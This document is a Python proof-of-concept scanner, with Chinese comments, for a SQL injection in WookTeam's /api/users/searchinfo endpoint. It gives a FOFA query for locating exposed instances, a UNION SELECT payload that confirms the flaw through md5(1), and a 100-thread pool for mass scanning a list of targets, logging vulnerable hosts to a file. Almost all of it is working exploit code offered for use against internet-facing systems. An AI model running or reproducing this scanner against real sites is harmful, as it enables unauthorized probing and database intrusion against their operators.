#WookTeam searchinfo SQL注入漏洞
#FOFA语法：title="Wookteam"
import sys,requests,argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool

def main():
    parse = argparse.ArgumentParser(description='WookTeam searchinfo SQL注入漏洞')
    parse.add_argument('-u','--url',dest='url',type=str,help='输入url')
    parse.add_argument('-f','--file',dest='file',type=str,help='输入file名')
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open (args.file,'r',encoding='utf-8')as f:
            for line in f.readlines():
                url_list.append(line.strip())
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        pass
def poc(target):
    payload="/api/users/searchinfo?where[username]=1%27%29+UNION+ALL+SELECT+NULL%2CCONCAT%280x7e%2Cmd5%281%29%2C0x7e%29%2CNULL%2CNULL%2CNULL%23"
    data=""
    proxy={
    'http': 'http://127.0.0.1:7890',
    'https': 'http://127.0.0.1:7890'
}
    headers={
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
    'Connection': 'keep-alive'
    }
    try:
        
        res1 = requests.post(url=target+payload,headers=headers,timeout=10,verify=False,proxies=proxy,data=data)
        if "c4ca4238a0b923820dcc509a6f75849b" in res1.text:
                print(target+"存在sql注入")
                with open('result.txt','a',encoding='utf-8')as f:
                    f.write(target+'\n')
    except Exception as e:
        pass

if __name__=='__main__':
    main()